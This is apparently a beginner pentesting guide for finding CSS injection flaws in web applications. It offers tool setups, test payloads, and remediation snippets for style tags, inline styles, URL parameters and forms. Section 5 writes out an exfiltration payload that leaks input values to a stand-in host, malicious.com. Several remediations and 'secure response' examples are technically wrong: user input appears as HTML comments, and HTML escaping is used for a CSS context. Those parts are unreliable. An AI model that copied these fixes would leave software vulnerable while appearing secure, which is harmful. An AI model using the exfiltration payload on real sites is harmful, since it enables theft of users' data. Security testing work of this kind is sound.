# Testing for CSS Injection Vulnerabilities

## Overview

Testing for CSS Injection Vulnerabilities involves verifying that a web application prevents the injection of malicious CSS code due to improper sanitization of user-controlled inputs. According to OWASP (WSTG-CLNT-05), CSS injection occurs when user inputs (e.g., form fields, URL parameters, or inline styles) are incorporated into CSS rules or styles without proper validation or encoding, allowing attackers to manipulate the page’s appearance or behavior. This guide provides a hands-on methodology to identify and test CSS injection vulnerabilities, focusing on common injection points (e.g., `<style>` tags, inline `style` attributes) and their impact, with tools, commands, and remediation strategies.

**Impact**: CSS injection vulnerabilities can lead to:
- Visual defacement, altering the application’s UI or layout.
- Data theft via CSS-based keylogging or attribute extraction.
- Phishing attacks by mimicking legitimate UI elements.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

This guide aligns with OWASP’s WSTG-CLNT-05, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. 

**Ethical Note**: Obtain explicit permission before testing, as injecting CSS payloads may trigger security alerts or violate terms of service.

## Testing Tools

The following tools are recommended for testing CSS injection vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts HTTP requests and tests for CSS injection in parameters or forms.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to modify and resend requests with CSS payloads.
  - **Note**: Check responses in Burp’s Render tab to visualize injected CSS effects.

- **Zed Attack Proxy (ZAP) 3.0**: A proxy tool for intercepting requests and scanning for client-side injection vulnerabilities.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:11000`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser payload testing.
  - Use Active Scan with “Client-side Injection” scan rules.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects rendered CSS and identifies injection points.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Elements tab to check for injected styles and Computed tab for CSS changes.
  - Example command to detect `<style>` tags or inline styles:
    ```javascript
    document.querySelectorAll('style, [style]').forEach(e => console.log(e.outerHTML));
    ```
  - **Tip**: Firefox’s 2025 CSS inspector enhancements improve style tracing.

- **cURL and HTTPie**: Send HTTP requests to test CSS payloads in URL parameters or form data.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/page?css=body{background:red}"
      # HTTPie
      http "http://example.com/page?css=body{background:red}"
      ```

- **XSStrike**: A Python-based tool for testing client-side injection vulnerabilities, including CSS injection.
  - Install:
    ```bash
    git clone https://github.com/s0md3v/XSStrike.git
    cd XSStrike
    pip install -r requirements.txt
    ```
  - Usage:
    ```bash
    python3 xsstrike.py -u "http://example.com/page?css=test" --dom
    ```
  - **Note**: Use `--dom` flag to focus on client-side CSS rendering.

- **CSS Payloads**: Curated payloads for manual and automated testing.
  - Sample payloads:
    - `body{background:red}`
    - `input[value]::after{content:"Hacked"}`
    - `*{display:none}`
  - Resource: [OWASP Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html).
  - **Tip**: Test payloads in form fields, URL parameters, or inline styles and inspect visual changes.

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-CLNT-05, testing CSS injection vulnerabilities across style tags, inline styles, URL parameters, form inputs, and potential data exfiltration.

### 1. Test `<style>` Tag Injection

**Objective**: Ensure user inputs are not rendered as CSS within `<style>` tags without sanitization.

**Steps**:
1. Identify `<style>` tags:
   - Open Browser Developer Tools (`F12` or `Ctrl+Shift+I`).
   - Use Elements tab to locate `<style>` tags or JavaScript-injected styles.
   - Console command:
     ```javascript
     document.querySelectorAll('style').forEach(s => console.log(s.textContent));
     ```
2. Inject a CSS payload:
   ```bash
   http "http://example.com/page?css=body{background:red}"
   ```
3. Check for injection:
   - Load the page and observe if the background turns red.
   - Inspect `<style>` tags in Elements tab for the payload.

**Example Secure Response**:
```html
<!-- Encoded input prevents rendering -->
<style>body{background:<!-- user input: body{background:red} -->}</style>
```
No background change.

**Example Vulnerable Response**:
```html
<!-- Unencoded input renders CSS -->
<style>body{background:red}</style>
```
Page background turns red.

**Remediation**:
- Encode CSS output:
  ```javascript
  document.querySelector('style').textContent = CSS.escape(userInput);
  ```
- Server-side encoding (e.g., in PHP):
  ```php
  echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
  ```

**Tip**: Save page screenshots and `<style>` tag contents in a report.

### 2. Test Inline Style Injection

**Objective**: Ensure inline `style` attributes do not process unsanitized user input.

**Steps**:
1. Identify inline styles:
   - Search for elements with `style` attributes in Elements tab.
   - Console command:
     ```javascript
     document.querySelectorAll('[style]').forEach(e => console.log(e.outerHTML));
     ```
2. Inject a CSS payload:
   ```bash
   http "http://example.com/page?style=background:blue"
   ```
3. Check for injection:
   - Inspect the page for a blue background on affected elements.
   - Verify `style` attribute in Elements tab.

**Example Secure Response**:
```html
<!-- Sanitized input prevents rendering -->
<div style="background:<!-- user input: background:blue -->">Content</div>
```
No background change.

**Example Vulnerable Response**:
```html
<!-- Unsanitized input renders CSS -->
<div style="background:blue">Content</div>
```
Element background turns blue.

**Remediation**:
- Sanitize inline styles:
  ```javascript
  element.style.background = userInput.match(/^[a-zA-Z0-9#]+$/) ? userInput : 'none';
  ```
- Use predefined styles:
  ```javascript
  element.className = 'safe-style';
  ```

**Tip**: Log payload responses and element screenshots in a report.

### 3. Test URL Parameter Injection

**Objective**: Ensure URL query parameters do not inject CSS without sanitization.

**Steps**:
1. Identify injectable parameters:
   - Analyze URLs for parameters (e.g., `?css=`, `?style=`).
   - Example: `http://example.com/page?css=default`.
2. Inject a CSS payload:
   ```bash
   http "http://example.com/page?css=*{display:none}"
   ```
3. Check for injection:
   - Load the URL and observe if all elements disappear.
   - Inspect `<style>` or `style` attributes in Elements tab.

**Example Secure Response**:
```html
<!-- Encoded parameter prevents rendering -->
<style>*{display:<!-- user input: *{display:none} -->}</style>
```
Page renders normally.

**Example Vulnerable Response**:
```html
<!-- Unencoded parameter renders CSS -->
<style>*{display:none}</style>
```
All elements disappear.

**Remediation**:
- Validate query parameters:
  ```javascript
  if (/^[a-zA-Z0-9]+$/.test(userInput)) {
    document.querySelector('style').textContent = userInput;
  }
  ```
- Server-side encoding (e.g., in Node.js):
  ```javascript
  res.write(escapeHtml(req.query.css));
  ```

**Tip**: Save URL payloads and page rendering screenshots in a report.

### 4. Test Form Input Injection

**Objective**: Ensure form inputs do not inject CSS into the page.

**Steps**:
1. Locate form fields:
   - Identify fields like “custom style” or “theme” on the target page.
2. Inject a CSS payload:
   - Enter `body{font-size:50px}` into a form field and submit.
3. Check for injection:
   - Inspect the page for enlarged text.
   - Use Elements tab to confirm CSS application.

**Example Secure Response**:
```html
<!-- Encoded input prevents rendering -->
<style>body{font-size:<!-- user input: body{font-size:50px} -->}</style>
```
Normal font size.

**Example Vulnerable Response**:
```html
<!-- Unencoded input renders CSS -->
<style>body{font-size:50px}</style>
```
Text appears enlarged.

**Remediation**:
- Encode form outputs:
  ```php
  echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
  ```
- Validate inputs server-side:
  ```javascript
  if (!/[{};]/.test(userInput)) {
    applyStyle(userInput);
  }
  ```

**Tip**: Save form submissions and page screenshots in a report.

### 5. Test for Data Exfiltration

**Objective**: Ensure CSS injection does not enable data theft (e.g., via attribute selectors).

**Steps**:
1. Inject a CSS payload for data exfiltration:
   ```bash
   http "http://example.com/page?css=input[value^='secret']{background:url(http://malicious.com/steal)}"
   ```
2. Check for exfiltration:
   - Monitor network requests in Network tab for calls to `malicious.com`.
   - Use Console to detect CSS application:
     ```javascript
     document.querySelectorAll('input').forEach(i => console.log(i.style.background));
     ```
3. Verify impact:
   - Check if sensitive input values (e.g., passwords) trigger requests.

**Example Secure Response**:
```html
<!-- Sanitized input prevents exfiltration -->
<style>input[value^='secret']{background:<!-- user input -->}</style>
```
No network requests to `malicious.com`.

**Example Vulnerable Response**:
```html
<!-- Unsanitized input enables exfiltration -->
<style>input[value^='secret']{background:url(http://malicious.com/steal)}</style>
```
Request sent to `malicious.com`.

**Remediation**:
- Block external URLs in CSS:
  ```javascript
  if (!userInput.includes('url(')) {
    document.querySelector('style').textContent = userInput;
  }
  ```
- Implement Content Security Policy (CSP):
  ```html
  <meta http-equiv="Content-Security-Policy" content="style-src 'self';">
  ```

**Tip**: Document network requests and CSS payloads in a report.